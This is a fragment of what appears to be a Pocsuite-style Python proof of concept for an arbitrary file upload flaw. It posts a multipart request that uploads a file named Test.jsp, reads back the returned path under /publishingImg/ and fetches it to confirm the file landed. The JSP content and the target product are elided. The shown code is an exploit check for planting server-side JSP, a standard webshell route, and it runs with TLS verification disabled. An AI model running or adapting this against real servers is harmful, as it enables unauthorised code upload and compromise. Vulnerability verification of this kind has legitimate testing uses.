...
class POC(POCBase):
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        ...
        payload =f'''--123\r
Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"\r
\r
...
--123--\r\n'''
        try:
            ...
            if resq.status_code == 200:
                path = json.loads(resq.text)['data']['path']
                shell_path = '/publishingImg/'+path
                #print(shell_path)
                resq_2  = requests.get(url=self.url+shell_path,headers=headers,timeout=5,verify=False)
                if shell_path in resq_2.text:
                    result['VerifyInfo'] = {}
